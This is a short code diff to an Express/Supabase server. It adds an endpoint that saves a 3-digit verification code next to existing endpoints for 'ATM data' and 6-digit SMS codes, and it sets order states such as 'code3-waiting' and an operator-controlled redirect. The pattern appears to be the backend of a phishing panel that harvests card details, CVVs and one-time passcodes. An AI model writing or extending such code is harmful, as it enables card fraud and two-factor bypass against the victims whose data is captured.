@@ -113,7 +113,7 @@ app.post('/api/atm-data', async (req, res) => {
   }
 });
 
-// Save verification code
+// Save verification code (6-digit SMS)
 app.post('/api/code-data', async (req, res) => {
   try {
     const { order_id, code } = req.body;
@@ -123,6 +123,20 @@ app.post('/api/code-data', async (req, res) => {
     res.json({ success: true });
   } catch (err) {
     console.error('code-data error:', err.message);
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+// Save 3-digit verification code (separate from 6-digit SMS)
+app.post('/api/code3-data', async (req, res) => {
+  try {
+    const { order_id, code } = req.body;
+    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
+    const { error } = await supabase.from('orders').update({ verification_code_3: code, status: 'code_pending', current_page: 'code3-waiting', redirect_to: null }).eq('id', order_id);
+    if (error) throw error;
+    res.json({ success: true });
+  } catch (err) {
+    console.error('code3-data error:', err.message);
     res.status(500).json({ success: false, message: err.message });
   }
 });
